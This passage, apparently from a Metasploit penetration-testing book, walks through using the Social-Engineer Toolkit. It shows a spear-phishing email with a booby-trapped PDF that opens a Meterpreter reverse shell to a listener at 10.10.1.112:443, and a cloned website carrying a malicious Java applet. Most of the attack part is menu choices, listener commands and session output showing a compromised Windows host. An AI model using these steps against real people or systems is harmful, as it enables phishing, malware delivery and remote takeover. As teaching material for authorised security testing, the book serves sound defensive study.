case, we will send a PDF file format bug to our target, like so.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_397.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">root@bt:/pentest/exploits/set# <span class="s24">./set</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Select from the menu:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">1. Spear-Phishing Attack Vectors</span></p><ol id="l12"><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 9pt;text-align: left;">Website Attack Vectors</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Infectious Media Generator</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Create a Payload and Listener</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Mass Mailer Attack</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Teensy USB HID Attack Vector</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">SMS Spoofing Attack Vector</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Wireless Access Point Attack Vector</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Third Party Modules</p></li><li><p class="s25" style="padding-top: 3pt;padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Update the Metasploit Framework</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Update the Social-Engineer Toolkit</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Help, Credits, and About</p></li><li><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">Exit the Social-Engineer Toolkit Enter your choice: <span class="s24">1</span></p></li></ol><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Welcome to the SET E-Mail attack method. This module allows you</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">to specially craft email messages and send them to a large (or small) number of people with attached fileformat malicious payloads. If you want to spoof your email address, be sure &quot;Sendmail&quot; is installed (it is installed in BT4) and change the config/set_config SENDMAIL=OFF flag to SENDMAIL=ON.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">There are two options, one is getting your feet wet and letting SET do everything for you (option 1), the second is to create your own FileFormat payload and use it in your own attack. Either way, good luck and enjoy!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8 <span class="s25">1. Perform a Mass Email Attack</span></p><ol id="l13"><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 9pt;text-align: left;">Create a FileFormat Payload</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Create a Social-Engineering Template</p></li><li><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">Return to Main Menu Enter your choice: <span class="s24">1</span></p></li></ol><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Select the file format exploit you want. The default is the PDF embedded EXE.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">********** PAYLOADS **********</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l14"><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">SET Custom Written Document UNC LM SMB Capture Attack</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe Flash Player &#39;Button&#39; Remote Code Execution</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe CoolType SING Table &#39;uniqueName&#39; Overflow</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 10pt;text-align: left;">Adobe Flash Player &#39;newfunction&#39; Invalid Pointer Use</p></li></ol><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 13pt;text-align: left;">@ <span class="s25">8. Adobe Collab.collectEmailInfo Buffer Overflow</span></p><ol id="l15"><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 9pt;text-align: left;">Adobe Collab.getIcon Buffer Overflow</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe JBIG2Decode Memory Corruption Exploit</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe PDF Embedded EXE Social Engineering</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe util.printf() Buffer Overflow</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Custom EXE to VBA (sent via RAR) (RAR required)</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe U3D CLODProgressiveMeshDeclaration Array Overrun</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Adobe PDF Embedded EXE Social Engineering (NOJS)</p></li><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow</p></li><li><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">Nuance PDF Reader v6.0 Launch Stack Buffer Overflow Enter the number you want (press enter for default): <span class="s24">8</span></p></li></ol><ol id="l16"><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Reverse TCP Shel Spawn a command shell on victim and send back to</p><p class="s25" style="padding-left: 227pt;text-indent: 0pt;line-height: 10pt;text-align: left;">attacker.</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim and send back</p><p class="s25" style="padding-left: 227pt;text-indent: 0pt;line-height: 10pt;text-align: left;">to attacker.</p></li><li><p class="s25" style="padding-top: 3pt;padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Reverse VNC DLL Spawn a VNC server on victim and send back to</p><p class="s25" style="padding-left: 227pt;text-indent: 0pt;line-height: 10pt;text-align: left;">attacker.</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Windows Reverse TCP Shell (x64) Windows X64 Command Shell, Reverse TCP Inline</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64),</p><p class="s25" style="padding-left: 227pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Meterpreter</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Shell Bind_TCP (X64) Execute payload and create an accepting port on</p><p class="s25" style="padding-left: 227pt;text-indent: 0pt;line-height: 10pt;text-align: left;">remote system.</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Windows Meterpreter Reverse HTTPS Tunnel communication over HTTP using SSL and use</p></li></ol><p class="s25" style="padding-left: 227pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Meterpreter.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">Enter the payload you want (press enter for default): [*] Windows Meterpreter Reverse TCP selected.</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter the port to connect back on (press enter for default):</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Defaulting to port 443...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Generating fileformat exploit...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Please wait while we load the module tree... [*] Started reverse handler on 10.10.1.112:443 [*] Creating &#39;template.pdf&#39; file...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf [*] Payload creation complete.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] All payloads get sent to the src/msf_attacks/template.pdf directory [*] Payload generation complete. Press enter to continue.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">As an added bonus, use the file-format creator in SET to create your attachment. Right now the attachment will be imported with filename of &#39;template.whatever&#39; Do you want to rename the file?</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">example Enter the new filename: moo.pdf</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">1. Keep the filename, I don&#39;t care.</span></p><ol id="l17"><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Rename the file, I want to be cool.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter your choice (enter for default): <span class="s24">1</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Keeping the filename and moving on.</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_398.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">From the SET main menu, select <span class="s25">Spear-Phishing Attack Vectors </span><span class="s32">O </span>fol- lowed by <span class="s25">Perform a Mass Email Attack </span><span class="s32">8</span>. This attack infects a PDF file using the Adobe <span class="s25">Collab.collectEmailInfo </span>vulnerability <span class="s32">@</span>, a Metasploit Meterpreter reverse payload <span class="s32">O </span>that is the SET default. <span class="s25">Collab.collectEmailInfo </span>is a heap- based exploit that, if opened (and if the target’s version of Adobe Acrobat</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">is vulnerable to this exploit), will connect to the attacking workstation on port 443, which usually allows outbound traffic from most networks.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: left;">You are also given the option of renaming the malicious file to make it more enticing for the target to open. The default name (<span class="s19">template.pdf </span>) is selected <span class="s32">@ </span>in this scenario for demonstration purposes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_399.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Social Engineer Toolkit Mass E-Mailer</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">There are two options on the mass e-mailer, the first would</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">be to send an email to one individual person. The second option will allow you to import a list and send it to as many people as you want within that list.</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">What do you want to do:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">1. E-Mail Attack Single Email Address</span></p><ol id="l18"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 9pt;text-align: left;">E-Mail Attack Mass Mailer</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Return to main menu.</p></li></ol></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice: <span class="s24">1</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Do you want to use a predefined template or craft a one time email template.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8 <span class="s25">1. Pre-Defined Template</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2. One-Time Use Email Template</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter your choice: <span class="s24">1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Below is a list of available templates:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">1: New Update</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">2: Computer Issue</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">3: Strange internet usage from your computer 4: LOL...have to check this out...</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@ <span class="s25">5: Status Report</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6: Pay Raise Application Form</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">7: WOAAAA!!!!!!!!!! This is crazy... 8: BasketBall Tickets</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">9: Baby Pics</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">10: Have you seen this? 11: Termination List</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">12: How long has it been?</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">13: Dan Brown&#39;s Angels &amp; Demons Enter the number you want to use: <span class="s24">5</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <a href="mailto:ihazomgsecurity@secmaniac.com" class="s34" target="_blank">Enter who you want to send email to: </a><a href="mailto:ihazomgsecurity@secmaniac.com" class="s40" target="_blank">ihazomgsecurity@secmaniac.com</a></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">What option do you want to use?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l19"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Use a GMAIL Account for your email attack.</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Use your own server or open relay</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Enter your choice: <span class="s24">1</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@ <a href="mailto:fakeemailaddy@gmail.com" class="s34" target="_blank">Enter your GMAIL email address: </a><a href="mailto:fakeemailaddy@gmail.com" class="s40" target="_blank">fakeemailaddy@gmail.com</a></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Enter your password for gmail (it will not be displayed back to you):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">SET has finished delivering the emails.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_400.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: justify;">Next we email this attack to a single email address <span class="s32">O </span>using the SET pre- defined email template <span class="s32">8 </span><span class="s25">Status Report </span><span class="s32">@</span>. Finally, we enter the email address (<span class="s24">ihazomgsecurity@secmaniac.com</span>) <span class="s32">O </span>to send the malicious file to and have SET use a Gmail account <span class="s32">@ </span>to send the message.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">Finally, create a Metasploit listener for the payload to connect back to <span class="s32">O</span>. When SET launches Metasploit, it configures all the necessary options and starts to listen on your attacking IP address on port 443 <span class="s32">8</span>, as configured earlier.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_401.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">Do you want to setup a listener yes or no: </span><span class="s24">yes</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (src/program_junk/meta_config)&gt; use exploit/multi/handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; set LHOST 10.10.1.112 LHOST =&gt; 10.10.1.112</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; set LPORT 443 LPORT =&gt; 443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; set ENCODING shikata_ga_nai ENCODING =&gt; shikata_ga_nai</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; set ExitOnSession false ExitOnSession =&gt; false</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; exploit -j [*] Exploit running as background job.</p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span class="s25">[*] Started reverse handler on 10.10.1.112:443 [*] Starting the payload handler...</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(handler) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_402.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="mailto:ihazomgsecurity@secmaniac.com" class="s31" target="_blank">We’ve just set up an attack against </a><a href="mailto:ihazomgsecurity@secmaniac.com" class="s20" target="_blank">ihazomgsecurity@secmaniac.com</a>, crafted an email to the recipient, and used an Adobe file format exploit. SET allowed us to create templates and have them dynamically imported when we use the tool. When the target opens the email and double-clicks the Adobe file, he’ll see something like Figure 10-1.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="442" height="253" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_403.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 10-1: The target’s view of the infected PDF file</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The target opens the PDF thinking it’s legitimate, and his system is instantly compromised. On the attacker’s side, you see the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_404.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 10.10.1.112:443 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(handler) &gt; [*] Sending stage (748032 bytes) to 10.10.1.102 [*] Meterpreter session 1 opened (10.10.1.112:443 -&gt; 10.10.1.102:58087)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">sessions -i 1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">shell</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process 2976 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Channel 1 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">C:\Documents and Settings\Bob\Desktop&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_405.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This example used a spear-phishing attack to target one user, but SET can also be used to attack multiple targets using the “mass email” option. You can also create customized templates that can be reused, instead of using the prebuilt templates included in SET.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark296">Web Attack Vectors</a><a name="bookmark312">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Web attack vectors are probably one of the most advanced and exciting aspects of SET, because they are specifically crafted to be believable and enticing to the target. SET can clone websites that look identical to trusted sites, helping to ensure that the target will think he is visiting a legitimate site.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark297">Java Applet</a><a name="bookmark313">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The Java applet attack is one of the most successful attack vectors in SET. The applet itself was created by one of the SET developers, Thomas Werth. This attack introduces a malicious Java applet that does smart browser detection (so your exploit works) and delivers a payload to a target’s machine. The Java applet attack is not considered a vulnerability by Java. When a target browses the malicious site, he is presented with a warning asking if he wants to run an untrusted Java applet. Because Java allows you to sign an applet with any name you choose, you could call the publisher Google, Microsoft, or any other string you choose. By editing the <span class="s19">set_config </span>file and setting <span class="s25">WEBATTACK_EMAIL </span>to <span class="s25">ON</span>, you can also incorporate mass emails with this attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s walk through a real-world example—a penetration test performed for a Fortune 1000 company. First, a copycat domain name, similar to that of the actual company website, was registered. Next, the attacker scraped the Internet looking for <span class="s19">@&lt;company&gt;.com </span>email addresses using the harvester module within Metasploit. After extracting 200 email addresses from public websites, mass emails were sent to these addresses. The attack email claimed to be from the company’s communications department and asked the employee</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">to look at the newly designed corporate website. Each email was personalized with the recipient’s name and claimed that the employee could click a link to see a picture of himself on the corporate home page. The email said that this new website displayed the employee’s photograph as a testimony to his hard work. Curiosity and fear were the prime motivators in getting each target to click the URL immediately.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After the target clicked the link, a Java applet notification popped up, signed by the employee’s corporation. The target clicked the run command because the notification looked legitimate; however, the command was based on the cloned site under the fake domain. Even though the employees didn’t see their pictures, they were presented with a website that looked legitimate, not realizing that their machines had been compromised: When the user clicked Run on the Java applet security prompt, a payload was executed and a shell delivered to the attacker. Once the payload was executed, the target was redirected back to the legitimate site.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www/" class="s31" target="_blank">SET can be used to clone a website and rewrite portions of it so that when a target visits the malicious site it looks identical to the original site. Let’s see how we could set up this attack on a fictitious site, </a><a href="http://www/" class="s20" target="_blank">http://www</a></p><p style="text-indent: 0pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_406.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 198%;text-align: left;"><span class="s19">.secmaniac.com/</span><span class="p">, in SET: </span>root@bt:/pentest/exploits/set# <span class="s24">./set </span>Select from the menu:</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <span class="s25">2. Website Attack Vectors</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice: <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">8 <span class="s25">1. The Java Applet Attack Method</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice (press enter for default): <span class="s24">1</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The first method will allow SET to import a list of pre-defined web applications that it can utilize within the attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The second method will completely clone a website of your choosing and allow you to utilize the attack vectors within the completely same web application you were attempting to clone.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The third method allows you to import your own website, note that you should only have an index.html when using the import website functionality.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[!] Website Attack Vectors [!]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l20"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Web Templates</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@ <span class="s25">2. Site Cloner</span></p><ol id="l21"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 9pt;text-align: left;">Custom Import</p></li><li><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">Return to main menu Enter number (1-4): <span class="s24">2</span></p></li></ol><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.thisisafakesite.com/" class="s34" target="_blank">SET supports both HTTP and HTTPS Example: http://www.thisisafakesite.com</a></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <a href="http://www.secmaniac.com/" class="s34" target="_blank">Enter the url to clone: </a><a href="http://www.secmaniac.com/" class="s40" target="_blank">http://www.secmaniac.com</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.secmaniac.com/" class="s34" target="_blank">[*] Cloning the website: </a>http://www.secmaniac.com [*] This could take a little bit...</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Injecting Java Applet attack into the newly cloned website. [*] Filename obfuscation complete. Payload name is: 0xvV3cYfbLBI3 [*] Malicious java applet website prepped for deployment</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_407.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">To begin this attack scenario, select <span class="s25">Website Attack Vectors </span><span class="s32">O </span>from the SET main menu. Use the <span class="s25">Java Applet Attack Method </span><span class="s32">8</span>, and then choose <span class="s25">Site Cloner </span><span class="s32">@ </span>from the subsequent menu. Finally, tell SET to clone the SecManiac website <span class="s32">O</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: 